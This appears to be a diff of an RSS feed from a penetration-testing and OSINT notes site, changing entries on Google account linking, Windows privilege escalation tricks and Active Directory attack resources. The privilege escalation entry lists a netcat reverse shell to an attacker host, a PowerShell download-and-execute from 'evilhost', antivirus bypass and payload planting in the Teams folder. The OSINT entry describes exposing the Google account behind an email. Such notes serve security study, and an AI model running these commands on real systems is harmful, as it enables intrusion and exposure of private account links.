@@ -105,7 +105,7 @@ Broken Links # Check for broken links and domain takeover # For twitter, Twitter
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/platforms-hunting/google/</guid>
-      <description>Get UserIDs Google Drive Documents # Get user ID from Google Drive document # Logged # Open the source code and search for: &amp;#34;\x2210&amp;#34; and &amp;#34;\x2211&amp;#34; # Paste it in the Google Photos or Maps URL and find out more about your target. # Not logged in # Developer tools &amp;gt; Network &amp;gt; Filter &amp;#34;Permissions&amp;#34; # Load the document and get informations for owner &amp;amp; co Google Contacts # Google Contacts can help getting IDs from e-mails # But it may not work !</description>
+      <description>Linking to Google Account https://subfn.net/2020/06/15/ga-osint-trick/ # Using Google Analytics, you can check if a non-google e-mail address is linked to a Google account # Log into Google Analytics # Navigate to Admin &amp;gt; Account User Management &amp;gt; Add user # At this point, enter an email address. If the email is a backup email of a Google account, the primary Google email (e.g. the Google login email) will be disclosed</description>
     </item>
     
     <item>
@@ -635,7 +635,7 @@ Golden Ticket # Golden Ticket &amp;gt; Nom du compte administrateur (Administrat
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/tricks/</guid>
-      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://evilhost/Malicious.ps1&amp;#39;)&amp;#34; # Payload as a trusted binary # Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\ # Then %userprofile%\AppData\Local\Microsoft\Teams\Update.</description>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Alternative execution (eq &amp;#39;cmd.exe /c&amp;#39;) https://twitter.com/CyberRaiju/status/1273597319322058752?s=20 explorer.exe /root # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://evilhost/Malicious.ps1&amp;#39;)&amp;#34; # Payload as a trusted binary # Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\ # Then %userprofile%\AppData\Local\Microsoft\Teams\Update.</description>
     </item>
     
     <item>
@@ -905,10 +905,9 @@ Online DNS tools and services # VirusTotal runs its own passive DNS replication 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/resources/systems/</guid>
-      <description>Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  Privilege Escalation  PrivExchange (https://github.com/dirkjanm/PrivExchange) Abusing Exchange (https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/) Exploiting PrivExchange (https://chryzsh.github.io/exploiting-privexchange/)
+      <description>Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/) A pivot cheatsheet for pentesters (https://nullsweep.com/pivot-cheatsheet-for-pentesters/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  Privilege Escalation  PrivExchange (https://github.com/dirkjanm/PrivExchange) Abusing Exchange (https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/) Exploiting PrivExchange (https://chryzsh.github.io/exploiting-privexchange/)
  LOLBAS (https://lolbas-project.github.io/#)
- Windows EoP Cheatsheet (https://guif.re/windowseop)
- Windows Privilege Escalation (https://hackingandsecurity.</description>
+ Windows EoP Cheatsheet (https://guif.</description>
     </item>
     
     <item>
